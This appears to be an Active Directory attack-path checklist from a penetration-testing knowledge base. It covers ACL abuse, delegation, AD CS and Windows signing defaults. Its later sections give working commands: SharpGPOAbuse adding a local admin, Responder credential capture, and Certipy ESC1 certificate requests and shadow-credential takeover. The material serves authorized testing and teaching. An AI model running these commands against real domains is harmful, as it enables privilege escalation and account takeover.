---
title: AD attack-path checks
order: 4
tags: [ad, acl, delegation, adcs, bloodhound]
---

## ACL abuse

- [ ] Identify the object type, controlled principal and effective permission.
- [ ] Check inheritance and protected-object restrictions.
- [ ] Match the operation to the object: a group, user, computer and GPO expose different paths.
- [ ] Confirm the resulting access before marking the path complete.

[GenericAll reference](https://bloodhound.specterops.io/resources/edges/generic-all).

## Delegation prerequisites

- [ ] Identify unconstrained, constrained or resource-based constrained delegation.
- [ ] Record the controlled service, permitted SPNs and required host control.
- [ ] For TGT capture, confirm an incoming usable TGT; protected accounts can prevent forwarding.

TODO: verify the exact abuse command against the discovered delegation type and installed tool version.

[TGT path prerequisites](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt), [protected accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts).

## AD CS enrollment prerequisites

- [ ] Check enrollment rights, template publication, authentication EKUs and subject control.
- [ ] Check manager approval, required signatures, CA permissions and trust.
- [ ] Review missing CA/DC registry collection before trusting absent graph edges.
- [ ] Verify certificate authentication after issuance; issuance alone does not prove access.

[ESC1 conditions](https://bloodhound.specterops.io/resources/edges/adcs-esc1), [collector permissions](https://bloodhound.specterops.io/collect-data/sharphound-data-permissions).

## Certificate strong mapping after 2025

February 2025 updates made Full Enforcement the default. After the September 9, 2025 update, the compatibility registry override is unsupported. Verify the DC's patch state and strong certificate mapping before reusing older AD CS recipes. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

## SMB signing prerequisites

Check the actual host and connection direction. Current Microsoft guidance distinguishes Server 2025 outbound defaults from Windows 11 24H2 edition-specific inbound/outbound defaults. A signing result alone does not establish an end-to-end relay path. [Microsoft signing guide](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing).

## LDAP signing and channel binding

Signing and TLS channel binding are separate controls. Server 2025 new deployments and upgrades can have different effective policies. Check both; an LDAPS endpoint alone does not prove relay resistance. [Signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing), [channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding).

## GPO permissions

When a controlled principal can edit a GPO that applies to a target computer, push a task or group change through it:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --GPOName "Default Domain Policy" --Command "cmd.exe" --Arguments "/c net localgroup administrators {{USER}} /add"
```

Confirm the GPO's scope links to an OU holding the target, then force a refresh or wait for policy application. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

## Capture coerced authentication

Start Responder on the interface reachable from the target. Use a controlled service action or UNC path to trigger authentication; do not enable unrelated poisoning or DHCP features by default.

```bash
sudo responder -I '{{INTERFACE}}' -v
```

For an MSSQL trigger, use [xp_dirtree](services/databases#mssql-unc-authentication). Save the captured account and format, then use [NetNTLMv2 mode 5600](active-directory/credential-access#crack-a-captured-netntlmv2-response) when applicable. A capture does not prove relay access. [Responder quick start and SMB capture](https://github.com/lgandx/Responder).

## Enumerate AD CS with Certipy

Use a valid domain account and the confirmed DC. Enumerate enabled templates and CAs before choosing any request.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -text
```

Verify enrollment rights, authentication EKU, subject control, approval and signature requirements, CA permissions and strong mapping. A vulnerability label is a lead that still needs the listed conditions. [Certipy usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage), [ESC conditions](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

## Request and use an ESC1 certificate

Only after confirming ESC1 conditions. Set CA_HOST, CA, TEMPLATE, TARGET_USER and TARGET_SID from collected evidence. The request changes certificate state and must be within the authorized objective.

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}'
```

The second command expects the PFX filename produced by the request. Verify authentication rather than treating issuance as proof. If PKINIT fails, assess Schannel/LDAPS and strong mapping instead of repeating the same command. [Certipy find, req and auth workflow](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage).

## Shadow credentials with Certipy

Use only when the current principal has verified write permission for msDS-KeyCredentialLink on TARGET_USER. This modifies the target object; record the change and remove added credentials when required by the engagement.

```bash
certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -account '{{TARGET_USER}}'
```

Use the generated credential to authenticate as the target identity. [Certipy shadow command](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).
